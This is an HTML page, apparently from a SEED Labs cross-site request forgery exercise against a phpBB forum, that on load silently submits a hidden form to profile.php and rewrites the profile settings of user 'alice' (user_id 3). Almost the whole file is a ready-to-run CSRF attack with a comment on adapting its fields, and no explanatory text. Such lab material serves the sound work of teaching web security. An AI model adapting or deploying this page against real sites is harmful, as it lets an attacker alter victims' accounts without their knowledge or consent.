<html><body><h1>
This page sends a HTTP POST request onload.
</h1>
<script>
function post(url,fields)
{
   //create a <form> element.
   var p = document.createElement('form');
   //construct the form
   p.action = url;
   p.innerHTML = fields;
   p.target = '_self';
   p.method = 'post';
   //append the form to this web.
   document.body.appendChild(p);
   //submit the form
   p.submit();
}
function csrf_hack()
{
   var fields;

   // You should replace the following 3 lines with your form parameters
   fields += "<input type='hidden' name='username' value='alice'>";
   fields += "<input type='hidden' name='email' value='alice@seed.com'>";
   fields += "<input type='hidden' name='signature' value='signature changed'>";
   fields += "<input type='hidden' name='viewemail' value='0'>";
   fields += "<input type='hidden' name='hideonline' value='0'>";
   fields += "<input type='hidden' name='notifyreply' value='0'>";
   fields += "<input type='hidden' name='notifypm' value='1'>";
   fields += "<input type='hidden' name='popup_pm' value='1'>";
   fields += "<input type='hidden' name='attachsig' value='1'>";
   fields += "<input type='hidden' name='allowbbcode' value='1'>";
   fields += "<input type='hidden' name='allowhtml' value='0'>";
   fields += "<input type='hidden' name='allowsmilies' value='1'>";
   fields += "<input type='hidden' name='language' value='english'>";
   fields += "<input type='hidden' name='style' value='1'>";
   fields += "<input type='hidden' name='timezone' value='0'>";
   fields += "<input type='hidden' name='dateformat' value='d M Y h:i a'>";
   fields += "<input type='hidden' name='mode' value='editprofile'>";
   fields += "<input type='hidden' name='agreed' value='true'>";
   fields += "<input type='hidden' name='coppa' value='0'>";
   fields += "<input type='hidden' name='user_id' value='3'>";
   fields += "<input type='hidden' name='current_email' value='alice@seed.com'>";   
   fields += "<input type='hidden' name='Submit' value='Submit'>";

   // Note: don't add an element named 'submit' here;
   //       otherwise, p.submit() will not be invoked.
   //       'Submit' will work.

   post('http://www.csrflabphpbb.com/profile.php', fields);
}

window.onload = function(){csrf_hack();}

</script>

</body></html>

